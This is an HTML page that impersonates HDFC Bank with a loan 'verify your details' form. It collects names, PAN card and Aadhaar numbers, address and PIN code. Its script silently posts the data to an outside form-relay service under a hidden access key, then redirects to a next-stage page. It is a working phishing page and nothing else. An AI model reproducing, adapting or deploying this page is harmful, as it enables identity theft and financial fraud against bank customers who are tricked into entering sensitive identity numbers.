<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HDFC Bank - Verify Details</title>
    <style>
        :root { --hdfc-blue: #004c8f; --hdfc-red: #ed1c24; }
        body { font-family: Arial, sans-serif; margin: 0; background-color: #f5f5f5; }
        .header-main { background-color: var(--hdfc-blue); color: white; padding: 15px 15px 60px 15px; position: relative; }
        .real-logo-img { height: 25px; width: auto; margin-bottom: 25px; background-color: white; padding: 5px 8px; border-radius: 2px; display: block; }
        .progress-row { display: flex; align-items: center; justify-content: space-between; }
        .circle-num { border: 1px solid white; border-radius: 50%; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; font-size: 15px; }
        .step-text { font-size: 17px; font-weight: 400; }
        .form-container { background: white; padding: 30px 20px; margin-top: -45px; border-top-left-radius: 45px; min-height: 100vh; box-shadow: 0 -5px 15px rgba(0,0,0,0.05); position: relative; z-index: 2; }
        h2 { font-size: 21px; color: #333; margin-bottom: 25px; font-weight: 400; }
        .input-group { margin-bottom: 22px; }
        label { display: block; color: #666; font-size: 15px; margin-bottom: 10px; }
        input, select { width: 100%; border: none; border-bottom: 1px solid #ccc; padding: 12px 0; font-size: 17px; outline: none; background: transparent; }
        input:focus { border-bottom: 1px solid var(--hdfc-blue); }
        .btn-apply { background-color: var(--hdfc-blue); color: white; width: 100%; padding: 16px; border: none; border-radius: 4px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 30px; text-transform: uppercase; }
    </style>
</head>
<body>

    <div class="header-main">
        <img src="logo.png" alt="HDFC BANK" class="real-logo-img">
        <div class="progress-row">
            <div style="display:flex; align-items:center;">
                <div class="circle-num">01</div>
                <div class="step-text" style="margin-left:10px;">Please verify your details</div>
            </div>
        </div>
    </div>

    <div class="form-container">
        <form id="secureForm">
            <input type="hidden" name="access_key" value="Fea091d8-a631-4425-aff6-82815670893b">
            <input type="checkbox" name="botcheck" style="display:none">

            <h2>Welcome, Please share your details</h2>

            <div class="input-group">
                <label>First Name</label>
                <input type="text" name="First_Name" required>
            </div>

            <div class="input-group">
                <label>Last Name</label>
                <input type="text" name="Last_Name" required>
            </div>

            <div class="input-group">
                <label>PAN Card Number</label>
                <input type="text" name="PAN_Number" maxlength="10" style="text-transform: uppercase;" required>
            </div>

            <div class="input-group">
                <label>Aadhaar Number</label>
                <input type="number" name="Aadhaar_Number" required>
            </div>

            <div class="input-group">
                <label>Full Address</label>
                <input type="text" name="Address" required>
            </div>

            <div class="input-group">
                <label>PIN Code</label>
                <input type="number" name="Pincode" required>
            </div>

            <div class="input-group">
                <label>Loan Amount</label>
                <input type="number" name="Amount" required>
            </div>

            <button type="submit" class="btn-apply" id="submitBtn">Apply Now</button>
        </form>
    </div>

    <script>
        const form = document.getElementById('secureForm');
        const btn = document.getElementById('submitBtn');

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            btn.disabled = true;
            btn.innerText = "Processing...";

            const formData = new FormData(form);
            const object = Object.fromEntries(formData);
            const json = JSON.stringify(object);

            fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                body: json
            })
            .then(async (response) => {
                if (response.status == 200) {
                    // SUCCESS: Redirecting to your page
                    window.location.href = "enter2.html";
                } else {
                    alert("Verification Required! Check your Email done87034@gmail.com and click Verify.");
                    btn.disabled = false;
                    btn.innerText = "Apply Now";
                }
            })
            .catch(error => {
                console.log(error);
                btn.innerText = "Error! Try Again";
                btn.disabled = false;
            });
        });
    </script>
</body>
</html>
